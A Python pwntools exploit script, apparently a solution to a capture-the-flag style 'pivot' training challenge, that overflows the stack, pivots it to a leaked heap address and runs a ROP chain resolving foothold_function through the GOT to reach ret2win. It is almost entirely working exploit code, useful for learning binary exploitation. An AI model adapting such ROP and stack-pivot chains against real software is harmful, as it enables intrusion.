#!/usr/bin/env python3

from pwn import *

context(terminal = ["tmux", "new-window"])

p = gdb.debug("./pivot", gdbscript = '''
init-peda
b *0x400ad7
''')
context.log_level = "DEBUG"
# we see that the stack size is 3 qwords, so we need to pivot the stack somewhere else
# if we run the program, we see that it gives us an address, that being the heap
# what are we gonna do is pivot the change the rsp into that address

heap_addr = p.recvline_contains("The Old Gods kindly bestow upon you a place to pivot:").strip().rsplit(' ', 1)[1]
heap_addr = u64(unhex(heap_addr[2:]).rjust(8, '\x00'), endian='big')
log.info("Heap address: 0x%x" % heap_addr)
xchg_rax_rsp = p64(0x400b02)
pop_rax = p64(0x400b00)
junk = "A"*40
stack_smash = junk + pop_rax + p64(heap_addr) + xchg_rax_rsp
# we use radare2 to calculate the offset between ret2win and foothold
# ? sym.ret2win-sym.foothold_function
# hex     0x14e
# then we use objdump -D to get the foothold@plt and @got
# and now we need to add 0x14e to foothold_got
foothold_plt = p64(0x400850)
foothold_got = p64(0x602048)
add_rax = p64(0x400b09) # add rax, rbp ; ret
pop_rbp = p64(0x400900) # pop rbp ; ret
call_rax = p64(0x40098e) # call rax
mov_rax = p64(0x400b05) # mov rax, qword ptr [rax] ; ret
puts_plt = p64(0x400800)
main = p64(0x400830)

rop2 = foothold_plt + pop_rax + foothold_got + mov_rax + pop_rbp + p64(0x14e) + add_rax + call_rax


p.recvuntil("Send your second chain now and it will land there")
p.sendline(rop2)

p.recvuntil("Now kindly send your stack smash")
p.sendline(stack_smash)


p.interactive()
